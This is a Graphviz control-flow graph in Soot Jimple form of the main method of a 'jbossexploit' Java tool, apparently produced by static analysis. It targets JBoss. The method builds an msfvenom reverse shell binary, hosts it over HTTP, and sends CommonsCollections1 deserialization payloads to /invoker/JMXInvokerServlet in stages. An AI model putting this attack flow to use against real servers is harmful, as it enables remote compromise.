digraph "unitGraph" {
    "Block 0:
[preds: ] [succs: 1 2 ]
r1 := @parameter0: java.lang.String[];
r0 = staticinvoke <jbossexploit.Msfvenom: java.lang.String generateBinaryName()>();
r2 = staticinvoke <jbossexploit.Cli: org.apache.commons.cli.CommandLine parseArguments(java.lang.String[])>(r1);
r3 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"rhost\");
$r4 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"rport\");
i0 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r4);
r5 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"lhost\");
$r6 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"lport\");
i1 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r6);
$r7 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"srvport\");
i2 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r7);
r21 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"uripath\");
if r21 != null goto r22 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"payload\");
"
    "Block 1:
[preds: 0 ] [succs: 2 ]
r21 = \"/invoker/JMXInvokerServlet\";
"
    "Block 2:
[preds: 0 1 ] [succs: 3 4 ]
r22 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"payload\");
if r22 != null goto $r9 = <java.lang.System: java.io.PrintStream out>;
"
    "Block 3:
[preds: 2 ] [succs: 4 ]
r22 = \"CommonsCollections1\";
"
    "Block 4:
[preds: 2 3 ] [succs: 5 ]
$r9 = <java.lang.System: java.io.PrintStream out>;
$r8 = new java.lang.StringBuilder;
specialinvoke $r8.<java.lang.StringBuilder: void <init>()>();
$r10 = virtualinvoke $r8.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"Generating reverse shell binary with msfvenom at /tmp/\");
$r11 = virtualinvoke $r10.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r0);
$r12 = virtualinvoke $r11.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"...\");
$r13 = virtualinvoke $r12.<java.lang.StringBuilder: java.lang.String toString()>();
virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>($r13);
staticinvoke <jbossexploit.Msfvenom: boolean generateBinary(java.lang.String,int,java.lang.String)>(r5, i1, r0);
$r14 = <java.lang.System: java.io.PrintStream out>;
virtualinvoke $r14.<java.io.PrintStream: void println(java.lang.String)>(\"Starting HTTP Server...\");
staticinvoke <jbossexploit.Main: void hostFile(int)>(i2);
$r15 = <java.lang.System: java.io.PrintStream out>;
virtualinvoke $r15.<java.io.PrintStream: void println(java.lang.String)>(\"Sending serialized commands...\");
i3 = 0;
"
    "Block 5:
[preds: 4 6 ] [succs: 6 7 ]
if i3 >= 3 goto return;
"
    "Block 6:
[preds: 5 ] [succs: 5 ]
$r17 = <java.lang.System: java.io.PrintStream out>;
$r16 = new java.lang.StringBuilder;
specialinvoke $r16.<java.lang.StringBuilder: void <init>()>();
$r18 = virtualinvoke $r16.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"Sending stage \");
$r19 = virtualinvoke $r18.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>(i3);
$r20 = virtualinvoke $r19.<java.lang.StringBuilder: java.lang.String toString()>();
virtualinvoke $r17.<java.io.PrintStream: void println(java.lang.String)>($r20);
staticinvoke <jbossexploit.Stager: void sendPayload(int,java.lang.String,int,java.lang.String,int,java.lang.String,java.lang.String,java.lang.String)>(i3, r3, i0, r5, i2, r0, r21, r22);
i3 = i3 + 1;
goto [?= (branch)];
"
    "Block 7:
[preds: 5 ] [succs: ]
return;
"
    "Block 0:
[preds: ] [succs: 1 2 ]
r1 := @parameter0: java.lang.String[];
r0 = staticinvoke <jbossexploit.Msfvenom: java.lang.String generateBinaryName()>();
r2 = staticinvoke <jbossexploit.Cli: org.apache.commons.cli.CommandLine parseArguments(java.lang.String[])>(r1);
r3 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"rhost\");
$r4 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"rport\");
i0 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r4);
r5 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"lhost\");
$r6 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"lport\");
i1 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r6);
$r7 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"srvport\");
i2 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r7);
r21 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"uripath\");
if r21 != null goto r22 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"payload\");
"->"Block 1:
[preds: 0 ] [succs: 2 ]
r21 = \"/invoker/JMXInvokerServlet\";
";
    "Block 0:
[preds: ] [succs: 1 2 ]
r1 := @parameter0: java.lang.String[];
r0 = staticinvoke <jbossexploit.Msfvenom: java.lang.String generateBinaryName()>();
r2 = staticinvoke <jbossexploit.Cli: org.apache.commons.cli.CommandLine parseArguments(java.lang.String[])>(r1);
r3 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"rhost\");
$r4 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"rport\");
i0 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r4);
r5 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"lhost\");
$r6 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"lport\");
i1 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r6);
$r7 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"srvport\");
i2 = staticinvoke <java.lang.Integer: int parseInt(java.lang.String)>($r7);
r21 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"uripath\");
if r21 != null goto r22 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"payload\");
"->"Block 2:
[preds: 0 1 ] [succs: 3 4 ]
r22 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"payload\");
if r22 != null goto $r9 = <java.lang.System: java.io.PrintStream out>;
";
    "Block 1:
[preds: 0 ] [succs: 2 ]
r21 = \"/invoker/JMXInvokerServlet\";
"->"Block 2:
[preds: 0 1 ] [succs: 3 4 ]
r22 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"payload\");
if r22 != null goto $r9 = <java.lang.System: java.io.PrintStream out>;
";
    "Block 2:
[preds: 0 1 ] [succs: 3 4 ]
r22 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"payload\");
if r22 != null goto $r9 = <java.lang.System: java.io.PrintStream out>;
"->"Block 3:
[preds: 2 ] [succs: 4 ]
r22 = \"CommonsCollections1\";
";
    "Block 2:
[preds: 0 1 ] [succs: 3 4 ]
r22 = virtualinvoke r2.<org.apache.commons.cli.CommandLine: java.lang.String getOptionValue(java.lang.String)>(\"payload\");
if r22 != null goto $r9 = <java.lang.System: java.io.PrintStream out>;
"->"Block 4:
[preds: 2 3 ] [succs: 5 ]
$r9 = <java.lang.System: java.io.PrintStream out>;
$r8 = new java.lang.StringBuilder;
specialinvoke $r8.<java.lang.StringBuilder: void <init>()>();
$r10 = virtualinvoke $r8.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"Generating reverse shell binary with msfvenom at /tmp/\");
$r11 = virtualinvoke $r10.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r0);
$r12 = virtualinvoke $r11.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"...\");
$r13 = virtualinvoke $r12.<java.lang.StringBuilder: java.lang.String toString()>();
virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>($r13);
staticinvoke <jbossexploit.Msfvenom: boolean generateBinary(java.lang.String,int,java.lang.String)>(r5, i1, r0);
$r14 = <java.lang.System: java.io.PrintStream out>;
virtualinvoke $r14.<java.io.PrintStream: void println(java.lang.String)>(\"Starting HTTP Server...\");
staticinvoke <jbossexploit.Main: void hostFile(int)>(i2);
$r15 = <java.lang.System: java.io.PrintStream out>;
virtualinvoke $r15.<java.io.PrintStream: void println(java.lang.String)>(\"Sending serialized commands...\");
i3 = 0;
";
    "Block 3:
[preds: 2 ] [succs: 4 ]
r22 = \"CommonsCollections1\";
"->"Block 4:
[preds: 2 3 ] [succs: 5 ]
$r9 = <java.lang.System: java.io.PrintStream out>;
$r8 = new java.lang.StringBuilder;
specialinvoke $r8.<java.lang.StringBuilder: void <init>()>();
$r10 = virtualinvoke $r8.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"Generating reverse shell binary with msfvenom at /tmp/\");
$r11 = virtualinvoke $r10.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r0);
$r12 = virtualinvoke $r11.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"...\");
$r13 = virtualinvoke $r12.<java.lang.StringBuilder: java.lang.String toString()>();
virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>($r13);
staticinvoke <jbossexploit.Msfvenom: boolean generateBinary(java.lang.String,int,java.lang.String)>(r5, i1, r0);
$r14 = <java.lang.System: java.io.PrintStream out>;
virtualinvoke $r14.<java.io.PrintStream: void println(java.lang.String)>(\"Starting HTTP Server...\");
staticinvoke <jbossexploit.Main: void hostFile(int)>(i2);
$r15 = <java.lang.System: java.io.PrintStream out>;
virtualinvoke $r15.<java.io.PrintStream: void println(java.lang.String)>(\"Sending serialized commands...\");
i3 = 0;
";
    "Block 4:
[preds: 2 3 ] [succs: 5 ]
$r9 = <java.lang.System: java.io.PrintStream out>;
$r8 = new java.lang.StringBuilder;
specialinvoke $r8.<java.lang.StringBuilder: void <init>()>();
$r10 = virtualinvoke $r8.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"Generating reverse shell binary with msfvenom at /tmp/\");
$r11 = virtualinvoke $r10.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r0);
$r12 = virtualinvoke $r11.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"...\");
$r13 = virtualinvoke $r12.<java.lang.StringBuilder: java.lang.String toString()>();
virtualinvoke $r9.<java.io.PrintStream: void println(java.lang.String)>($r13);
staticinvoke <jbossexploit.Msfvenom: boolean generateBinary(java.lang.String,int,java.lang.String)>(r5, i1, r0);
$r14 = <java.lang.System: java.io.PrintStream out>;
virtualinvoke $r14.<java.io.PrintStream: void println(java.lang.String)>(\"Starting HTTP Server...\");
staticinvoke <jbossexploit.Main: void hostFile(int)>(i2);
$r15 = <java.lang.System: java.io.PrintStream out>;
virtualinvoke $r15.<java.io.PrintStream: void println(java.lang.String)>(\"Sending serialized commands...\");
i3 = 0;
"->"Block 5:
[preds: 4 6 ] [succs: 6 7 ]
if i3 >= 3 goto return;
";
    "Block 5:
[preds: 4 6 ] [succs: 6 7 ]
if i3 >= 3 goto return;
"->"Block 6:
[preds: 5 ] [succs: 5 ]
$r17 = <java.lang.System: java.io.PrintStream out>;
$r16 = new java.lang.StringBuilder;
specialinvoke $r16.<java.lang.StringBuilder: void <init>()>();
$r18 = virtualinvoke $r16.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"Sending stage \");
$r19 = virtualinvoke $r18.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>(i3);
$r20 = virtualinvoke $r19.<java.lang.StringBuilder: java.lang.String toString()>();
virtualinvoke $r17.<java.io.PrintStream: void println(java.lang.String)>($r20);
staticinvoke <jbossexploit.Stager: void sendPayload(int,java.lang.String,int,java.lang.String,int,java.lang.String,java.lang.String,java.lang.String)>(i3, r3, i0, r5, i2, r0, r21, r22);
i3 = i3 + 1;
goto [?= (branch)];
";
    "Block 5:
[preds: 4 6 ] [succs: 6 7 ]
if i3 >= 3 goto return;
"->"Block 7:
[preds: 5 ] [succs: ]
return;
";
    "Block 6:
[preds: 5 ] [succs: 5 ]
$r17 = <java.lang.System: java.io.PrintStream out>;
$r16 = new java.lang.StringBuilder;
specialinvoke $r16.<java.lang.StringBuilder: void <init>()>();
$r18 = virtualinvoke $r16.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(\"Sending stage \");
$r19 = virtualinvoke $r18.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>(i3);
$r20 = virtualinvoke $r19.<java.lang.StringBuilder: java.lang.String toString()>();
virtualinvoke $r17.<java.io.PrintStream: void println(java.lang.String)>($r20);
staticinvoke <jbossexploit.Stager: void sendPayload(int,java.lang.String,int,java.lang.String,int,java.lang.String,java.lang.String,java.lang.String)>(i3, r3, i0, r5, i2, r0, r21, r22);
i3 = i3 + 1;
goto [?= (branch)];
"->"Block 5:
[preds: 4 6 ] [succs: 6 7 ]
if i3 >= 3 goto return;
";
}
